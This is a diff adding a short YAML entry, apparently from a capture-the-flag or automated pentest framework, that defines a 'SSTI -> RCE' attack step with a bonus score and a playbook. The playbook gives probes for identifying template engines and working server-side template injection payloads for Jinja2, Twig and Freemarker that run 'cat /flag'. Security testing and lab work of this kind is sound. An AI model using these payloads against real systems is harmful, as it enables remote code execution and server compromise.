@@ -1,0 +1,11 @@
+id: ssti_to_rce
+name: SSTI -> RCE
+impact: Remote code execution through the template engine
+bonus: 7
+requires:
+  - any_of: [ssti]
+playbook: |
+  1. Confirm engine: {{7*7}} (Jinja2/Twig), ${7*7} (Freemarker), <%= 7*7 %> (ERB).
+  2. Jinja2: {{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}.
+  3. Twig: {{['cat /flag']|filter('system')}} / _self gadgets.
+  4. Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("cat /flag")}.
